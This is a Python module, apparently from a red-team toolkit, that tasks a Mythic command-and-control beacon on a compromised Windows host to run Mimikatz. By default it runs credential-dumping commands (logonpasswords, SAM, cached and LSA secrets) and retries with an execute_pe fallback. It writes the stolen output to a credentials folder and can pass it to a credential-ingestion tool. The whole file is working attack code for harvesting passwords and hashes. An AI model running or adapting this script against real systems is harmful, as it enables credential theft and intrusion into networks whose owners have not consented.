from __future__ import annotations

import subprocess
from pathlib import Path

from mythic_operator.api import (
    beacon_to_row,
    create_task,
    extract_task_id,
    find_beacon,
    issue_task_and_wait_output,
    poll_task_output,
)

DEFAULT_COMMANDS = [
    "sekurlsa::logonpasswords",
    "lsadump::sam",
    "lsadump::cache",
    "lsadump::lsa /patch",
]


def parse_commands(value: str | None) -> list[str]:
    if not value:
        return DEFAULT_COMMANDS
    return [item.strip() for item in value.split(",") if item.strip()]


def _command_string(commands: list[str]) -> str:
    return " ".join(commands)


def _to_int(value: str) -> int | None:
    try:
        return int(str(value))
    except (TypeError, ValueError):
        return None


def _extract_inline_output(task_response) -> str:
    if isinstance(task_response, dict):
        for key in ("response", "output", "stdout", "user_output", "message"):
            value = task_response.get(key)
            if isinstance(value, str) and value.strip():
                return value.strip()
    return ""


async def run_mimikatz(
    session,
    beacon_selector: str,
    commands_value: str | None,
    ingest: bool,
    tag: str | None,
    save: str | None,
    dry_run: bool,
) -> None:
    commands = parse_commands(commands_value)
    mimikatz_args = _command_string(commands)
    execute_pe_args = f'-PE mimikatz -Arguments "{mimikatz_args}"'

    if dry_run:
        print(f"[*] Beacon: {beacon_selector}")
        print(f"[*] Primary task: mimikatz {mimikatz_args}")
        print(f"[*] Fallback task: execute_pe {execute_pe_args}")
        return

    beacon = await find_beacon(session, beacon_selector)
    beacon_row = beacon_to_row(beacon)
    beacon_id = beacon_row["id"]
    callback_numeric_id = _to_int(beacon_row["name"]) or _to_int(beacon_id)

    if callback_numeric_id is None:
        raise RuntimeError(f"Beacon '{beacon_selector}' does not have a numeric display id required by Mythic")

    task_response = None
    output = ""
    try:
        output = await issue_task_and_wait_output(
            session=session,
            callback_display_id=callback_numeric_id,
            command_name="mimikatz",
            parameters=mimikatz_args,
            timeout=240,
        )
        print("[+] Submitted built-in mimikatz task")
    except Exception as primary_error:
        try:
            output = await issue_task_and_wait_output(
                session=session,
                callback_display_id=callback_numeric_id,
                command_name="execute_pe",
                parameters=execute_pe_args,
                timeout=240,
            )
            print("[+] Built-in mimikatz unavailable; submitted execute_pe fallback")
        except Exception:
            try:
                task_response = await create_task(
                    session,
                    beacon_id=beacon_id,
                    callback_display_id=beacon_row["name"],
                    callback_numeric_id=callback_numeric_id,
                    wait_for_complete=True,
                    command_name="mimikatz",
                    params=mimikatz_args,
                )
                print("[+] Submitted built-in mimikatz task")
            except Exception:
                task_response = await create_task(
                    session,
                    beacon_id=beacon_id,
                    callback_display_id=beacon_row["name"],
                    callback_numeric_id=callback_numeric_id,
                    wait_for_complete=True,
                    command_name="execute_pe",
                    params=execute_pe_args,
                )
                print("[+] Built-in mimikatz unavailable; submitted execute_pe fallback")

    task_id = ""
    if task_response is not None:
        task_id = str(
            getattr(task_response, "id", None)
            or getattr(task_response, "task_id", None)
            or (task_response.get("id") if isinstance(task_response, dict) else None)
            or (task_response.get("task_id") if isinstance(task_response, dict) else None)
            or ""
        )
        if not task_id:
            task_id = extract_task_id(task_response)

    if not output and task_response is not None:
        output = _extract_inline_output(task_response)
    if not output and task_id:
        print(f"[*] Waiting for task output (task_id={task_id})")
        output = await poll_task_output(session, task_id=task_id, timeout=180, poll_interval=2)
    if not output:
        raise RuntimeError("Task completed but no output was returned by Mythic")
    print(output)

    save_path = Path(save) if save else Path("99_CREDS") / f'{beacon_row["host"] or "beacon"}.mimidump'
    save_path.parent.mkdir(parents=True, exist_ok=True)
    save_path.write_text(output, encoding="utf-8")
    print(f"[+] Saved output to {save_path}")

    if ingest:
        ingest_tag = tag or (beacon_row["host"] or beacon_selector)
        subprocess.run(
            ["credops", "creds", "ingest", "--tag", ingest_tag],
            input=output,
            text=True,
            check=True,
        )
        print(f"[+] Ingested output with credops tag '{ingest_tag}'")
